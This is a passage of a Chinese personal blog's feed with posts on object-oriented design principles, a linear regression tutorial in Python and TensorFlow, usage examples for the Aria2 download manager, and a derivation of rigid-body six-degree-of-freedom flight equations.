title="封装"></a>封装</h3><p>封装可以被认为是将某些东西放在一个类以内，并限制了它向外部展现的信息。在软件中，限制对内部对象和属性的访问有助于保证数据的完整性。</p><p>将内部编程逻辑封装成黑盒子，我们的类将更容易管理，因为我们知道哪部分可以被其它系统使用，哪些不行。这意味着我们在保留公共部分并且保证不破坏任何东西的同时能够重用内部逻辑。此外，我们从外部使用封装功能变得更加简单，因为需要考虑的事情也更少。</p><h3 id="分解"><a href="#分解" class="headerlink" title="分解"></a>分解</h3><p>分解就是把一个对象分割为多个更小的独立部分，这些独立的部分更易于理解、维护和编程。</p><p>试想我们现在希望 Hero 类能结合更多的 RPG 特征，例如 buffs，资产，装备，角色属性。</p><p>解决方案就是将 Hero 对象分解为多个更小的对象，每个小对象可承担一些功能。</p><p>下面是三种分解关系：</p><ul><li>关联：在两个组成部分之间定义一个松弛的关系。两个组成部分不互相依赖，但是可以一起工作。例如 Hero 对象和 Zone 对象。</li><li>聚合：在整体和部分之间定义一个弱「包含」关系。这种关系比较弱，因为部分可以在没有整体的时候存在。例如 HeroInventory（英雄财产）和 Item（条目）。HeroInventory 可以有很多 Items，而且一个 Items 也可以属于任何 HeroInventory（例如交易条目）。</li><li>组成：一个强「包含」关系，其中整体和部分不能彼此分离。部分不能被共享，因为整体要依赖于这些特定的部分。例如 Hero（英雄）和 HeroAttributes（英雄属性）。</li></ul><h3 id="泛化"><a href="#泛化" class="headerlink" title="泛化"></a>泛化</h3><p>泛化可能是最重要的设计原则，即我们提取共享特征，并将它们结合到一起的过程。我们都知道函数和类的继承，这就是一种泛化。</p><p>做一个比较可能会将这个解释得更加清楚：尽管抽象通过隐藏非必需的细节减少了复杂性，但是泛化通过用一个单独构造体来替代多个执行类似功能的实体。</p><p>在给出的例子中，我们将常用的 Hero 类和 NPC 类泛化为一个共同的父类 Entity，并通过继承简化子类的构建。</p><p>这里，我们通过将它们的共同功能移动到基本类中来减少复杂性，而不是让 NPC 类和 Hero 类将所有的功能都实现两次。</p><h3 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h3><p>组合就是把多个对象结合为一个更复杂对象的过程。这种方法会创建对象的示例，并且使用它们的功能，而不是直接继承它。</p><p>使用组合原则的对象就被称作组合对象（composite object）。这种组合对象在要比所有组成部分都简单，这是非常重要的一点。当把多个类结合成一个类的时候，我们希望把抽象的层次提高一些，让对象更加简单。</p><p>组合对象的 API 必须隐藏它的内部模块，以及内部模块之间的交互。就像一个机械时钟，它有三个展示时间的指针，以及一个设置时间的旋钮，但是它内部包含很多运动的独立部件。</p><p>正如我所说的，组合要优于继承，这意味着我们应该努力将共用功能移动到一个独立的对象中，然后其它类就使用这个对象的功能，而不是将它隐藏在所继承的基本类中。</p><h2 id="批判性思考"><a href="#批判性思考" class="headerlink" title="批判性思考"></a>批判性思考</h2><p>尽管这些设计原则是在数十年经验中形成的，但盲目地将这些原则应用到代码之前进行批判性思考是很重要的。</p><p>任何事情都是过犹不及！有时候这些原则可以走得很远，但是实际上有时会变成一些很难使用的东西。</p><p>作为一个工程师，我们需要根据独特的情境去批判地评价最好的方法，而不是盲目地遵从并应用任意的原则。</p><h2 id="关注点的内聚、耦合和分离"><a href="#关注点的内聚、耦合和分离" class="headerlink" title="关注点的内聚、耦合和分离"></a>关注点的内聚、耦合和分离</h2><h3 id="内聚（Cohesion）"><a href="#内聚（Cohesion）" class="headerlink" title="内聚（Cohesion）"></a>内聚（Cohesion）</h3><p>内聚代表的是模块内部责任的分明，或者是模块的复杂度。</p><p>如果我们的类只执行一个任务，而没有其它明确的目标，那么这个类就有着高度内聚性。另一方面，如果从某种程度而言它在做的事情并不清楚，或者具有多于一个的目标，那么它的内聚性就非常低。</p><p>我们希望代码具有较高的内聚性，如果发现它们有非常多的目标，或许我们应该将它们分割出来。</p><h3 id="耦合"><a href="#耦合" class="headerlink" title="耦合"></a>耦合</h3><p>耦合获取的是连接不同类的复杂度。我们希望类与其它的类具有尽可能少、尽可能简单的联系，所以我们就可以在未来的事件中交换它们（例如改变网络框架）。</p><p>在很多编程语言中，这都是通过大量使用接口来实现的，它们抽象出处理特定逻辑的类，然后表征为一种适配层，每个类都可以嵌入其中。</p><h3 id="分离关注点"><a href="#分离关注点" class="headerlink" title="分离关注点"></a>分离关注点</h3><p>分离关注点（SoC）是这样一种思想：软件系统必须被分割为功能上互不重叠的部分。或者说关注点必须分布在不同的地方，其中关注点表示能够为一个问题提供解决方案。</p><p>网页就是一个很好的例子，它具有三个层（信息层、表示层和行为层），这三个层被分为三个不同的地方（分别是 HTML，CSS，以及 JS）。</p><p>如果重新回顾一下我们的 RPG 例子，你会发现它在最开始具有很多关注点（应用 buffs 来计算袭击伤害、处理资产、装备条目，以及管理属性）。我们通过分解将那些关注点分割成更多的内聚类，它们抽象并封装了它们的细节。我们的 Hero 类现在仅仅作为一个组合对象，它比之前更加简单。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>对小规模的代码应用这些原则可能看起来很复杂。但是事实上，对于未来想要开发和维护的任何一个软件项目而言，这些规则都是必须的。在刚开始写这种代码会有些成本，但是从长期来看，它会回报以几倍增长。</p><p>这些原则保证我们的系统更加：</p><p>可扩展：高内聚使得不用关心不相关的功能就可以更容易地实现新模块。<br>可维护：低耦合保证一个模块的改变通常不会影响其它模块。高内聚保证一个系统需求的改变只需要更改尽可能少的类。<br>可重用：高内聚保证一个模块的功能是完整的，也是被妥善定义的。低耦合使得模块尽可能少地依赖系统的其它部分，这使得模块在其它软件中的重用变得更加容易。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://zhuanlan.zhihu.com/p/36330531" target="_blank" rel="noopener">如何写一手漂亮的模型：面向对象编程的设计原则综述</a>,by 机器之心.</li><li><a href="https://www.zhihu.com/question/24863332" target="_blank" rel="noopener">什么是面向切面编程AOP？</a>,by 知乎.</li><li><a href="https://blog.csdn.net/liuweitoo/article/details/8166503" target="_blank" rel="noopener">什么是面向方面编程</a>,by liuweitoo.</li><li><a href="https://blog.csdn.net/hguisu/article/details/7586704" target="_blank" rel="noopener">AOP面向方面编程</a>,by 规速.</li><li><a href="https://www.jianshu.com/p/a833d114099a" target="_blank" rel="noopener">团队开发框架实战—面向切面的编程 AOP</a>,by Bobby0322.</li><li><a href="https://blog.csdn.net/yanquan345/article/details/19760027" target="_blank" rel="noopener">轻松理解AOP(面向切面编程)</a>,by -望远-.</li><li><a href="https://github.com/android-cn/blog/tree/master/java/dependency-injection" target="_blank" rel="noopener">依赖注入</a>,by android-cn.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;说来惭愧，我虽然计算机科学专业科班出生，但是对面向对象编程的理解并不透彻。但在看到“如何写一手漂亮的模型：面向对象编程的设计原则综述”后，感觉收获不少，欣喜之余感觉摘抄记录一下。&lt;/p&gt;
&lt;h1 id=&quot;面向对象编程的设计原则&quot;&gt;&lt;a href=&quot;#面向对象编程的设计原则&quot;
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="软件工程" scheme="https://huangwang.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>机器学习之线性回归问题求解</title>
    <link href="https://huangwang.github.io/2019/01/12/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E9%97%AE%E9%A2%98%E6%B1%82%E8%A7%A3/"/>
    <id>https://huangwang.github.io/2019/01/12/机器学习之线性回归问题求解/</id>
    <published>2019-01-12T09:46:35.000Z</published>
    <updated>2019-01-12T14:39:58.003Z</updated>
    
    <content type="html"><![CDATA[<p>在统计学中，线性回归（Linear regression）是利用称为线性回归方程的最小二乘函数对一个或多个自变量和因变量之间关系进行建模的一种回归分析。这种函数是一个或多个称为回归系数的模型参数的线性组合。只有一个自变量的情况称为简单回归，大于一个自变量情况的叫做多元回归。下面以简单线性回归为例，以机器学习的方法求解此问题。</p><h1 id="问题设定"><a href="#问题设定" class="headerlink" title="问题设定"></a>问题设定</h1><p>已知有 $N$ 个 $x, y$ 对构成数据集 $X, Y$ ，他们在坐标轴上的分布如下图：</p><p align="center">    <img src="images/dataset.png" width="80%" alt="数据集"></p><p>现在希望找到一个函数：</p><script type="math/tex; mode=display">h(x) = wx+b</script><p>这个函数会尽可能的拟合数据集 $X, Y$ ，为了做到这点，我们希望这个函数 $h(x)$ 在 $X$ 上每一个取值 $x_i$ 的函数值 $h(x_i)$ 与 $Y$ 上每一个对应的 $y_i$ 的平方差尽可能小。即找到一组 $w, b$ ，能使得 $loss(w, b)$ 最小。</p><script type="math/tex; mode=display">loss(w, b) = \frac{1}{N}\sum^{N}_{i=0}(wx_i+b-y_i)^2</script><h1 id="问题求解"><a href="#问题求解" class="headerlink" title="问题求解"></a>问题求解</h1><p>采用梯度下降法找到目标 $w, b$，先随机初始化一对 $w_0, b_0$。由于函数的负梯度方向是函数值下降最快的方向，因此对 $w, b$ 求其偏微分:</p><script type="math/tex; mode=display">\begin{aligned} \frac{\partial loss(w, b)}{\partial w} &= \frac{2}{N}\sum^{N}_{i=0}(wx_i+b-y_i)\cdot x_i, \\ \frac{\partial loss(w, b)}{\partial b} &= \frac{2}{N}\sum^{N}_{i=0}(wx_i+b-y_i) \end{aligned}</script><p>再通过下式在每次迭代中更新 $w, b$ ：</p><script type="math/tex; mode=display">\begin{aligned} w_{t+1} &= w_t - \eta \frac{\partial l(w_t, b_t)}{\partial w_t} \\ b_{t+1} &= b_t - \eta \frac{\partial l(w_t, b_t)}{\partial b_t} \end{aligned}</script><p>其中， $\eta$ 是学习率。</p><h2 id="python实现"><a href="#python实现" class="headerlink" title="python实现"></a>python实现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line"># %matplotlib inline</span><br><span class="line"></span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"># 生成100对x, y</span><br><span class="line">data_count = 100</span><br><span class="line">w_cache, b_cache, l_cache, = [], [], []</span><br><span class="line"># 学习速度</span><br><span class="line">learning_rate = 0.003</span><br><span class="line"># 迭代次数</span><br><span class="line">training_steps = 3000</span><br><span class="line"></span><br><span class="line">x_data = np.linspace(-20, 20, data_count)</span><br><span class="line">y_data = np.multiply(4, x_data) + 7 + np.random.normal(loc=0, scale=8.0, size=(data_count,))</span><br><span class="line"></span><br><span class="line"># 初始化w和b</span><br><span class="line">w = np.random.rand()</span><br><span class="line">b = np.random.rand()</span><br><span class="line">y_predict = w * x_data + b</span><br><span class="line"></span><br><span class="line"># 梯度下降迭代3000次</span><br><span class="line">for iteration in range(training_steps):</span><br><span class="line">    y_predict = w * x_data + b</span><br><span class="line">    diff = y_predict - y_data</span><br><span class="line">    error = np.sum(np.square(diff)) / data_count</span><br><span class="line">    grad_w = np.mean(diff * x_data)</span><br><span class="line">    grad_b = np.mean(diff)</span><br><span class="line">    w -= learning_rate * grad_w</span><br><span class="line">    b -= learning_rate * grad_b</span><br><span class="line">    w_cache.append(w)</span><br><span class="line">    b_cache.append(b)</span><br><span class="line">    l_cache.append(error)</span><br><span class="line"></span><br><span class="line">y_predict = w * x_data + b</span><br><span class="line"></span><br><span class="line"># 绘制结果</span><br><span class="line">plt.figure(figsize=(10, 6))</span><br><span class="line">plt.scatter(x_data, y_data, s=10, color=&apos;g&apos;)</span><br><span class="line">plt.plot(x_data, y_predict)</span><br><span class="line">plt.title(&apos;y=4x+7&apos;)</span><br><span class="line">plt.xlabel(&apos;x&apos;)</span><br><span class="line">plt.ylabel(&apos;y&apos;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="tensorflow实现"><a href="#tensorflow实现" class="headerlink" title="tensorflow实现"></a>tensorflow实现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import tensorflow as tf</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"># 初始化变量和模型参数，定义训练闭环中的运算</span><br><span class="line"></span><br><span class="line"># 生成100对x, y</span><br><span class="line">data_count = 100</span><br><span class="line"></span><br><span class="line"># 超参数，实际的训练迭代次数</span><br><span class="line">training_steps=1000</span><br><span class="line"></span><br><span class="line"># 超参数，学习速率</span><br><span class="line">learning_rate=0.003</span><br><span class="line"></span><br><span class="line"># 定义tf graph输入</span><br><span class="line">X = tf.placeholder(tf.float32)</span><br><span class="line">Y = tf.placeholder(tf.float32)</span><br><span class="line"># 定义模型参数</span><br><span class="line">W = tf.Variable(np.random.randn(), name=&quot;weight&quot;, dtype=tf.float32)</span><br><span class="line">b = tf.Variable(np.random.randn(), name=&quot;bias&quot;, dtype=tf.float32)</span><br><span class="line"></span><br><span class="line">def inference(X):</span><br><span class="line">    # 计算推断模型在数据X上的输出，并将结果返回</span><br><span class="line">    pred = tf.add(tf.multiply(W, X), b)</span><br><span class="line">    return pred</span><br><span class="line"></span><br><span class="line">def loss(X,Y):</span><br><span class="line">    # 依据训练数据X及其期望输出Y计算损失</span><br><span class="line">    pred = tf.add(tf.multiply(W, X), b)</span><br><span class="line">    cost = tf.reduce_sum(tf.pow(pred-Y, 2)) /  data_count</span><br><span class="line">    return cost</span><br><span class="line"></span><br><span class="line">def inputs():</span><br><span class="line">    # 读取或生成训练数据X及其期望输出Y</span><br><span class="line">    x_data = np.linspace(-20, 20, data_count)</span><br><span class="line">    y_data = np.multiply(4, x_data) + 7 + np.random.normal(loc=0, scale=8.0, size=(data_count,))</span><br><span class="line">    return (x_data,y_data)</span><br><span class="line"></span><br><span class="line">def train(total_loss):</span><br><span class="line">    # 依据计算的总损失训练或调整模型参数</span><br><span class="line">    optimizer = tf.train.GradientDescentOptimizer(learning_rate).minimize(total_loss)</span><br><span class="line">    return optimizer</span><br><span class="line">    </span><br><span class="line">def evaluate(sess,X,Y):</span><br><span class="line">    # 对训练得到的模型进行评估</span><br><span class="line">    # 因为是线性回归，这里只图示</span><br><span class="line">    plt.figure(figsize=(10, 6))</span><br><span class="line">    plt.scatter(X, Y, s=10, color=&apos;g&apos;)</span><br><span class="line">    pred=inference(X)</span><br><span class="line">    plt.plot(X, sess.run(pred))</span><br><span class="line">    plt.title(&apos;y=4x+7&apos;)</span><br><span class="line">    plt.xlabel(&apos;x&apos;)</span><br><span class="line">    plt.ylabel(&apos;y&apos;)</span><br><span class="line">    plt.show()</span><br><span class="line">    </span><br><span class="line"># 在一个会话对象中启动数据流图，搭建流程</span><br><span class="line">with tf.Session() as sess:</span><br><span class="line">    tf.initialize_all_variables().run()</span><br><span class="line">    </span><br><span class="line">    X,Y=inputs()</span><br><span class="line">    </span><br><span class="line">    total_loss=loss(X,Y)</span><br><span class="line">    train_op=train(total_loss)</span><br><span class="line">    </span><br><span class="line">    coord=tf.train.Coordinator()</span><br><span class="line">    threads=tf.train.start_queue_runners(sess=sess,coord=coord)</span><br><span class="line"></span><br><span class="line">    for step in range(training_steps):</span><br><span class="line">        sess.run([train_op])</span><br><span class="line">        # 出于调试和学习的目的，查看损失在训练过程中递减的情况</span><br><span class="line">        if step % 10 ==0:</span><br><span class="line">            print(&quot;loss: &quot;,sess.run([total_loss]))</span><br><span class="line"></span><br><span class="line">    evaluate(sess,X,Y)</span><br><span class="line"></span><br><span class="line">    coord.request_stop()</span><br><span class="line">    coord.join(threads)</span><br><span class="line">    sess.close()</span><br></pre></td></tr></table></figure><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol><li><a href="https://zh.wikipedia.org/wiki/线性回归" target="_blank" rel="noopener">线性回归</a>, by wikipedia.</li><li><a href="https://zhuanlan.zhihu.com/p/36553041" target="_blank" rel="noopener">重拾基础 - 线性回归（一）</a>, by Cerulean.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在统计学中，线性回归（Linear regression）是利用称为线性回归方程的最小二乘函数对一个或多个自变量和因变量之间关系进行建模的一种回归分析。这种函数是一个或多个称为回归系数的模型参数的线性组合。只有一个自变量的情况称为简单回归，大于一个自变量情况的叫做多元回归。
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="机器学习" scheme="https://huangwang.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="tensorflow" scheme="https://huangwang.github.io/tags/tensorflow/"/>
    
  </entry>
  
  <entry>
    <title>开源跨平台下载利器Aria2</title>
    <link href="https://huangwang.github.io/2019/01/07/%E5%BC%80%E6%BA%90%E8%B7%A8%E5%B9%B3%E5%8F%B0%E4%B8%8B%E8%BD%BD%E5%88%A9%E5%99%A8Aria2/"/>
    <id>https://huangwang.github.io/2019/01/07/开源跨平台下载利器Aria2/</id>
    <published>2019-01-07T11:39:12.000Z</published>
    <updated>2019-01-07T11:56:24.318Z</updated>
    
    <content type="html"><![CDATA[<p>长期以来，迅雷一直是我在Windows平台上首选的下载工具。但是随着迅雷软件升级更新后的下载限速和广告推销的愈演愈烈，我终于下定决心卸载了它。下面我推荐一款开源跨平台的下载利器Aria2。</p><h1 id="Aria2简介"><a href="#Aria2简介" class="headerlink" title="Aria2简介"></a>Aria2简介</h1><p>Aria2是一款自由、跨平台命令行界面的下载管理器，该软件根据GPLv2许可证进行分发。支持的下载协议有：HTTP、HTTPS、FTP、Bittorrent和Metalink。</p><p>不同于Wget这样的的命令行界面下载器，Aria2不仅支持BitTorrent，还能够从各种来源多路检索所请求的文件。包括HTTP，HTTPS，FTP和BitTorrent协议。aria2使用Metalink数据块的校验和自动查验BitTorrent下载的数据部分。</p><h1 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h1><p>从<a href="https://aria2.github.io/" target="_blank" rel="noopener">Aria2官网</a>下载最新Aria2安装包，当前Aria2最新的版本为1.34.0。</p><p>将下载的Aria2安装包aria2-1.34.0-win-64bit-build1解压到C盘目录，并将Aria2安装目录添加到Windows环境变量PATH。</p><p>重启后，打开Windows终端，即可在命令行中使用Aria2下载文件。</p><h1 id="使用帮助"><a href="#使用帮助" class="headerlink" title="使用帮助"></a>使用帮助</h1><p>从Web中下载文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aria2c http://example.org/mylinux.iso</span><br></pre></td></tr></table></figure><p>从2个源下载文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aria2c http://a/f.iso ftp://b/f.iso</span><br></pre></td></tr></table></figure><p>使用2个连接下载文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aria2c -x2 http://a/f.iso</span><br></pre></td></tr></table></figure></p><p>BitTorrent下载：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aria2c http://example.org/mylinux.torrent</span><br></pre></td></tr></table></figure></p><p>BitTorrent Magnet URI下载：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aria2c &apos;magnet:?xt=urn:btih:248D0A1CD08284299DE78D5C1ED359BB46717D8C&apos;</span><br></pre></td></tr></table></figure></p><p>按照txt中给出的URI下载：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aria2c -i uris.txt</span><br></pre></td></tr></table></figure></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://zh.wikipedia.org/wiki/Aria2" target="_blank" rel="noopener">Aria2</a>,by wikipedia.</li><li><a href="https://aria2.github.io/" target="_blank" rel="noopener">Aria2 Homepage</a>,by Aria2.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;长期以来，迅雷一直是我在Windows平台上首选的下载工具。但是随着迅雷软件升级更新后的下载限速和广告推销的愈演愈烈，我终于下定决心卸载了它。下面我推荐一款开源跨平台的下载利器Aria2。&lt;/p&gt;
&lt;h1 id=&quot;Aria2简介&quot;&gt;&lt;a href=&quot;#Aria2简介&quot; cl
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="常用工具" scheme="https://huangwang.github.io/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>飞行仿真之刚体六自由度方程</title>
    <link href="https://huangwang.github.io/2019/01/06/%E9%A3%9E%E8%A1%8C%E4%BB%BF%E7%9C%9F%E4%B9%8B%E5%88%9A%E4%BD%93%E5%85%AD%E8%87%AA%E7%94%B1%E5%BA%A6%E6%96%B9%E7%A8%8B/"/>
    <id>https://huangwang.github.io/2019/01/06/飞行仿真之刚体六自由度方程/</id>
    <published>2019-01-06T10:50:47.000Z</published>
    <updated>2019-01-26T07:49:33.825Z</updated>
    
    <content type="html"><![CDATA[<p>在飞行仿真中，获取飞机的位姿是基本要求。将飞行器视为刚体，根据牛顿第二定律和动量矩定理，即可推导出飞机的质心运动方程和飞机绕质心转动的动力学方程，即刚体的六自由度方程。下面即从《航空飞行器飞行动力学》中摘抄刚体六自由度方程的推导过程。</p><h1 id="飞行器质心运动方程"><a href="#飞行器质心运动方程" class="headerlink" title="飞行器质心运动方程"></a>飞行器质心运动方程</h1><p>根据牛顿第二定理：</p><script type="math/tex; mode=display">m\frac{dV}{dt}=F \tag{1}</script><p>式中$m$为飞行器质量，$V$为飞行器飞行速度矢量，$F$为作用于质心处外力的合力矢量。</p><p>具体研究飞行器质心运动规律时，工程上常建立投影正在一动坐标系的标量方程，并认为大气时静止的。</p><h2 id="一般动坐标系中质心动力学方程"><a href="#一般动坐标系中质心动力学方程" class="headerlink" title="一般动坐标系中质心动力学方程"></a>一般动坐标系中质心动力学方程</h2><p>取原点位于飞行器质心的一动坐标系$Oxyz$，它相对惯性坐标系$O_gx_gy_gz_g$有一转动角速度$w$。质心的绝对速度为$V$，如图1所示。</p><p align="center">    <img src="images/DynamicAxis.jpg" width="60%" alt="动系相对于惯性坐标系的关系"></p><center>图1 动系相对于惯性坐标系的关系</center>将速度$V$和角速度$w$分别在动坐标系上投影，则有$$V=V_xi+V_yj+V_zk \tag{2}$$$$w=w_xi+w_yj+w_zk \tag{3}$$式中$i,j,k$为动坐标系$Oxyz$的单位矢量。由于$w$存在，其方向将随时间变化。将公式$(2)和(3)$带入公式$(1)$，则速度$V$的微分，即质心的绝对加速度为：$$\frac{F}{m}=\frac{dV}{dt}=\frac{dV_x}{dt}i+\frac{dV_y}{dt}j+\frac{dV_z}{dt}k+V_x\frac{di}{dt}+V_y\frac{dj}{dt}+V_z\frac{dk}{dt} \tag{4}$$式中单位矢量导数$di/dt$是矢量端点$i$的速度，此时矢端曲线是绕$w$旋转的圆，因此：$$\frac{di}{dt}=w\times i$$$$\frac{dy}{dt}=w\times y$$$$\frac{dz}{dt}=w\times z$$将上述关系代入公式$(4)$，即可知质心的绝对加速度可表示为$$\frac{F}{m}=\frac{dV}{dt}=\frac{\delta V}{\delta t}+w \times V  \tag{5}$$其中：$$\frac{\delta V}{\delta t}=\frac{dV_x}{dt}i+\frac{dV_y}{dt}j+\frac{dV_z}{dt}k$$式$(5)$中$\frac{\delta V}{\delta t}$为动系角速度$w=0$时的加速度，即相当于观察者站在动坐标系中所看到的质心加速度；$w\times V$为由于存在角速度$w$使$V$相对于动坐标系方向发生变化而产生的加速度；$\frac{dV}{dt}$为质心的绝对加速度，即观察者在地面坐标系上所看到的加速度。同样合力矢量$F$用动坐标系上投影表示为：$$F=F_xi+F_yj+F_zk$$于是式$(5)在动坐标系$Oxyz$上投影的质心动力学标量方程如下：$$m(\frac{dV_x}{dt}+V_zw_y-V_yw_z)=F_x$$$$m(\frac{dV_y}{dt}+V_xw_z-V_zw_x)=F_y$$$$m(\frac{dV_z}{dt}+V_yw_x-V_xw_y)=F_z$$上述方程组适用于任何动坐标系。# 飞行器绕质心的动力学方程根据动量矩定理，飞行器绕质心的转动运动可表示为：$$M=\frac{dh}{dt} \tag{6}$$式中$h$为飞行器对坐标系原点的动量矩；$M$为作用在飞行器上的外力对原点的合力矩。<p align="center">    <img src="images/MomentumOfCentroid.jpg" width="60%" alt="对质心的动量矩"></p><center>图2 对质心的动量矩</center><p>根据动量矩定义，飞行器上任意微元质量为dm，对坐标系原点的动量矩为：</p><script type="math/tex; mode=display">\Delta h=r\times V dm</script><p>式中$r$为微元质量到坐标系原点的矢径；$V$为该微元质量的速度矢量，则</p><script type="math/tex; mode=display">V=V_o+w\times r</script><p>式中$V_o$为坐标系原点速度（如坐标原点取为飞行器质心，则为质心速度）；$w$为坐标系转动角速度。</p><p>于是飞行器的总动量矩可积分得出</p><script type="math/tex; mode=display">h=\int r\times V dm=\int r dm \times V_o +\int r \times (w \times r) dm</script><p>取坐标系原点为质心时，有</p><script type="math/tex; mode=display">\int r dm=0</script><p>飞行器动量矩简化为</p><script type="math/tex; mode=display">h=\int r \times (w\times r) dm \tag{7}</script><p>上式表明，飞行器的动量矩只取决于转动产生的速度部分，而与质心运动速度$V_o$无关。矢径$r$和角速度$w$用坐标系中投影分量表示为：</p><script type="math/tex; mode=display">r=xi+yj+zk</script><script type="math/tex; mode=display">w=w_xi+w_yj+w_zk</script><p>将上述关系式代入式$(7)$，经整理得：</p><script type="math/tex; mode=display">h_x=w_xI_x-w_yI_{xy}-w_zI_{zx}</script><script type="math/tex; mode=display">h_y=w_yI_y-w_xI_{xy}-w_zI_{yx}</script><script type="math/tex; mode=display">h_z=w_zI_z-w_xI_{zx}-w_yI_{yz}</script><p>式中$I_x,I_y,I_z$分别为飞行器对$Ox轴,Oy轴,Oz轴$地惯性矩，分别为：</p><script type="math/tex; mode=display">I_x=\int (y^2+z^2) dm</script><script type="math/tex; mode=display">I_y=\int (x^2+z^2) dm</script><script type="math/tex; mode=display">I_z=\int (x^2+y^2) dm</script><p>而$I<em>{xy},I</em>{yz},I_{zx}$则为对$Ox轴与Oy轴$，$Oy轴与Oz轴$，$Oz轴与Ox轴$的惯性积，分别为</p><script type="math/tex; mode=display">I_{xy}=\int xy dm</script><script type="math/tex; mode=display">I_{yz}=\int yz dm</script><script type="math/tex; mode=display">I_{zx}=\int zx dm</script><h2 id="一般动坐标系中绕质心转动动力学方程"><a 